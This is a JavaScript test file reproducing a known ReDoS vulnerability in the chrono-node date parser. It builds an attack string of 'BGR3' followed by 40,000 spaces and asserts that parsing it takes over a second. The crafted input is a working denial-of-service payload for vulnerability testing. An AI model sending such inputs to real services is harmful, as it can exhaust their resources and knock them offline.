//https://github.com/wanasit/chrono/issues/382
test("ReDos in chrono-node", () => {

    const genstr = require("./utils").genstr;
    const measureTime = require("./utils").measureTime;
    const chrono = require("chrono-node");

    //let attack_str = 'BGR3                              186                              days                              18                              hours                              37                              minutes                    01                    seconds';
    let attack_str = 'BGR3' + genstr(40000," ") + "186'"; 
    let t = measureTime(function () {
        chrono.parse(attack_str);
    });
    

    let time= t[0]+t[1]/1000000000;
    
    expect(time).toBeGreaterThan(1);
});